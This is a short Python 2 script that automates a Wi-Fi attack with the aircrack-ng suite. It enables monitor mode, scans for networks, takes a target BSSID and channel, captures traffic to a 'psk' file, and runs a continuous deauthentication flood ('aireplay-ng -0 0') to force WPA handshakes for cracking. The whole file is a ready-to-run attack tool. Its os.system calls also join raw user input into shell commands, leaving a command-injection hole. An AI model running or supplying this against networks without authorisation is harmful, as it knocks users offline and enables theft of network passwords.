import re
import commands
import os
import time

class Nullnetwork:


	def __init__(self):
		self.interface = ""
		self.monitor   = ""
		self.bssid     = ""
		self.channel   = ""


	def getInterface(self):
		str = commands.getoutput("ifconfig")
		try:
			i = re.search('(w).*(:)', str).group(0)[:-1]
			#print i.group(0)[:-1]
		except:
			print "No Match Found!"
			i = raw_input("Network Interface: ")
		if "mon" in i:
			self.monitor = i
		else:
			self.interface = i


	def killProcess(self):
		print "Killing process...",
		try:
			os.system("airmon-ng check kill")
			print "OK"
		except:
			print "Unable to kill process :("


	def startAirmon(self):
		try:
			if self.interface == "":
				i = raw_input("Network Interface: ")
				self.interface = i
			os.system("airmon-ng start " + self.interface)
		except:
			print "Airmon failed to start :("


	def airodump_ng(self):
		try:
			os.system("airodump-ng " + self.monitor)
		except KeyboardInterrupt:
			print "Exiting Airodump..."


	def getBSSID(self):
		b = raw_input("BSSID: ")
		self.bssid = b


	def aireplay_ng(self):
		try:
			os.system("aireplay-ng -0 0 -a " + self.bssid + " " + self.monitor)
		except:
			print "Aireplay failed :("


	def getChannel(self):
		c = raw_input("Channel: ")
		self.channel = c


	def finalAirodump(self):
		try:
			os.system("airodump-ng -c " + self.channel
				+ " --bssid " + self.bssid + " -w psk "
					+ self.monitor)
		except:
			print "Final Airodump failed :("
#-------------------------------------------------------
N = Nullnetwork()
N.getInterface()
N.killProcess()
N.startAirmon()
N.getInterface()
N.airodump_ng()
N.getBSSID()
N.getChannel()
N.finalAirodump()
N.aireplay_ng()
#print N.interface
#print N.monitor
